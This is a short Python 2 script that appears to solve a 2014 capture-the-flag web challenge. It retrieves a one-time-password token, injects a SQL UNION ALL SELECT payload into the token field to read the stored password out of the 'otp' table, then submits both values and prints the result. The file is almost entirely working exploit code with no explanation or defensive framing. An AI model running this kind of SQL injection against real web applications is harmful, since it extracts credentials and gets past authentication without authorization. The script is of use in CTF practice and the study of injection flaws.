import urllib,urllib2

URI = 'http://otp.adctf2014.katsudon.org/'

def communicate(values):
    if(values is not None):
        data = urllib.urlencode(values)
        req = urllib2.Request(URI,data)
    else:
        req = urllib2.Request(URI)
    res = urllib2.urlopen(req)
    return res.read().split('\n')

if __name__ == '__main__':
    token = communicate(None)[22].split('"')[5]
    print 'token : %s' % token

    query = "' union all select (with tmp(token,pass,expire) as (select * from otp) select pass from tmp where token = '%s')--" % token
    values = {'token' : query}
    passwd = communicate(values)[21].split(' ')[3][:-4]
    print 'pass  : %s' % passwd

    values = {'token' : token, 'pass' : passwd}
    for s in communicate(values)[21][3:-4].split('<br />'):
        print s

    raw_input('Press any key to exit...')
